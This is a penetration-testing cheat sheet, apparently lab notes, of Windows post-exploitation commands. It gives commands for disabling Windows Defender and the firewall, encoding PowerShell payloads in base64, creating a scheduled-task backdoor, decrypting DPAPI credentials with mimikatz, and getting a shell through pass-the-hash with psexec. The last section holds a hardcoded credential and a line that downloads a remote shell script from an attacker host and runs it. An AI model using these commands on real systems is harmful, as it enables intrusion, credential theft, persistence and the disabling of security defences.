## Avoid problems with quotes
- """ powershell <"command"> """


## Shutdown WIndows defender (Need NT AUTHORITY\SYSTEM rights):
#### DOS
```bat
# Stop windows defender
sc config WinDefend start= disabled
sc stop WinDefend

# Start Windows defender at boot up
sc config WinDefend start= auto
sc start WinDefend
sc query WinDefend
```

#### Powershell
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableRealtimeMonitoring $false
```
## Disable Windows Firewall
```bat
netsh firewall set opmode disable
```

## Encode and execute powershell commands:
Converting a powershell script into a base64 format to avoid bad characters:
```bash
echo <payload.ps1> | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard
```

#### Executing encoded powershell
```powershell
powershell -enc <payload_base64>
```

## VHD (virtual host disk) files:
```bash
# list all the files		
7z | <file.vhd>
# mount a vhd file on linux:
guestmount -add <vhd file> --inspector --ro -v <mount_point>
```

## OST (Microsoft Outlook email folder) files:
```bash
# This will give us a outlook email folder
# We can open it using evolution
readpst <ost_file>
```

## Create a backdoor (Scheduled task)
#### Link:
- https://www.howtogeek.com/51236/how-to-create-modify-and-delete-scheduled-tasks-from-the-command-line/
```powershell
# Query current task:
SchTasks /query

# Create a New task:
SchTasks /Create /SC DAILY /TN "My Task" /TR "C:RunMe.bat" /ST 09:00  
   # /Create: Create a new task
   # /SC: Planification frequence
   # /TN: task name
   # /TR: Path to binary to execute
   # /ST: Start time

# Modify a task:
SchTasks /Change /TN "My Task" /ST 14:00
   # /Change: Modify a current task
   # /TN: Task name
   # /ST: New start time

# Delete a task:
SchTasks /Delete /TN "My Task"
   # /TN: Task name
```

## DPAPI
- Video Access de IPPSEC

#### files needed
```powershell
# Download the files
cd c:\users\<username>\appdata\Roaming\Microsoft\Protect\<user_sid>
# Download the files
cd c:\users\<username>\appdata\Roaming\Microsoft\Credentials
  
# Get user SID
```
#### Decrypt DPAPI MASTERKEY: Using mimikatz (Need a Windows box)
- Get all the downloaded files
- Get a version of Mimikatz

In mimikatz :
```powershell
dpapi::masterkey /in:<encrypted_master_key_file> /sid:<sid_of_user> /password:<user_password>
```
#### Decrypt the file (Masterkey stored inside the mimikatz session)
```powershell
dpapi::cred /in:<encrypted_file> 
```

## Windows Stream (data stream)
#### Link
- https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/
#### Commands
```powershell
Get-Item -path <filename> -stream *
powershell (Get-Content hm.txt -Stream root.txt)
```
#### It is possible to access and thus read the content of “Alternate Data Stream” through SMB commands
```powershell
allinfo “<filename>”
```
#### Get the content of an alternate data stream
```powershell
get “<filename>”:<name_of_the_stream>
```
#### Note:
- It is a pretty good way to hide sensitive informations. In general, it is mostly used by malwares.

	
## PSEXEC
```python
# Execute Commands on remote system (need credentials and read write access to ADMIN$ share folder)
python psexec.py administrator@<ip> 
# We can also simply pass the NTML hash to psexec and get a shell:
python psexec -hashes <hash>:<hash> administrator@10.10.10.10 
```
	
It is possible, if we have the hash of a golden ticket to create a new user with admin rights:
- https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
   - Section: Overpass The Hash/Pass the key (PTK)
		
		
## MDB files (Access DB file)
```bash
# Interact with the db using T-SQL
mdb-sql <file.mdb>
mdb-tables <file.mdb>
```
## As NT AUTHORITY, we can start the RDP protocol:
Powershell:  
```powershell
# Set the firewall to down state
netsh advfirewall set allprofiles state off  
```
Configure a registry key to start the RDP service:  
- [https://pureinfotech.com/enable-remote-desktop-powershell-windows-10/](https://pureinfotech.com/enable-remote-desktop-powershell-windows-10/)  

```bash
# Connect to the instance  
xfreerdp /v:<machine_name> /u:<username> /p:<password>
```

## RUNAS in Powershell
```powershell
$username = "BART\Administrator"
$password = "3130438f31186fbaf962f407711faddb"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.15.48:8083/shell.ps1') } -Credential $cred -Computer localhost
```